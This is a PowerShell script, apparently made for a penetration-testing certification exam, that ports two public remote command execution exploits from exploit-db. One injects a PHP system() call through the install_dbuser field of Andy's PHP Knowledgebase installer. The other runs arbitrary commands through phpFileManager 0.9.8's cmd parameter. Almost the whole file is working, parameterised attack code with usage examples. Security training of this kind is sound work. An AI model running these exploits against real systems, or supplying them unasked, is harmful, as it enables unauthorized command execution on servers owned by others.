function Andy-php {
<#
.DESCRIPTION
This script will import command injection for andy's php cms RCE 
Exploit ported to powershell from https://www.exploit-db.com/exploits/35783
# Exploit Title: Remote Command Execution
# Date:  2011-05-19 
# Exploit Author:  AutoSec Tools  
.EXAMPLE
PS C:\> . .\exploit.ps1
PS C:\> Andy-php -Target 127.0.0.1 -Cmd calcs.exe
PS C:\> Andy-php -Target 127.0.0.1 
.PARAMETER Target
The target IP Address.
.PARAMETER Cmd
The command to run on remote computer. Default calc.exe
.LINK
https://www.exploit-db.com/exploits/35783
https://stackoverflow.com/questions/17325293/invoke-webrequest-post-with-parameters
.NOTES
This script has been created for completing the requirements of the SecurityTube PowerShell for Penetration Testers Certification Exam
http://www.securitytube-training.com/online-courses/powershell-for-pentesters/
Student ID:3270

#>


[CmdletBinding()] Param(
    [Parameter(Mandatory = $true)]
    [string]
    $Target ,

    [Parameter(Mandatory = $false)]
    [string]
    $cmd = "calc.exe"
)
try {
    # prepare the stracture of the right url to exploit 
    $pwn = "http://" + $Target + "/aphpkb/install/step5.php"
    $fullcmd = "');system('"+$cmd+"');//"
    $postParams = @{install_dbuser= $fullcmd; submit="Submit+Query"}
    # sending the request 
    $req = Invoke-WebRequest -Uri $pwn -Method Post -Body $postParams 
    # sending the second request to the target to execute the 
    $popup = Invoke-WebRequest -Uri $pwn

}
catch {
    Write-Error -Message "command $cmd execution failed"
}

}

function phpFileManager {
  <#
.SYNOPSYS
phpFileManager 0.9.8 - Remote Command Execution. 
.DESCRIPTION
Exploit ported to powershell from https://www.exploit-db.com/exploits/37709/
# Exploit Title: Remote Command Execution
# Date:   2015-07-28  
# Exploit Author:  hyp3rlinx 
.PARAMETER Target
The target IP Address.
.PARAMETER Cmd
The command to run on remote computer. Default executes whoami command 
.EXAMPLE
PS C:\> . .\exploit.ps1
PS C:\> phpFileManager -Target 127.0.0.1 -Cmd dir
PS C:\> phpFileManager -Target 127.0.0.1 
.LINK
https://www.exploit-db.com/exploits/37709
.NOTES
This script has been created for completing the requirements of the SecurityTube PowerShell for Penetration Testers Certification Exam
http://www.securitytube-training.com/online-courses/powershell-for-pentesters/
Student ID:3270
#>


    [CmdletBinding()] Param(
    [Parameter(Mandatory = $true)]
    [string]
    $Target ,

    [Parameter(Mandatory = $false)]
    [string]
    $cmd = "c%3A\Windows\system32\cmd.exe" 
    )

    # prepare the request ro execute the RCE
    try {
        $url = "https://$Target/phpFileManager-0.9.8/index.php?action=6&current_dir=C:/xampp/htdocs/phpFileManager-0.9.8/&cmd=$cmd"
        $pwn = Invoke-WebRequest -uri $url 
    }
    catch {
        Write-Error -Message "command $cmd execution failed"
    }
}



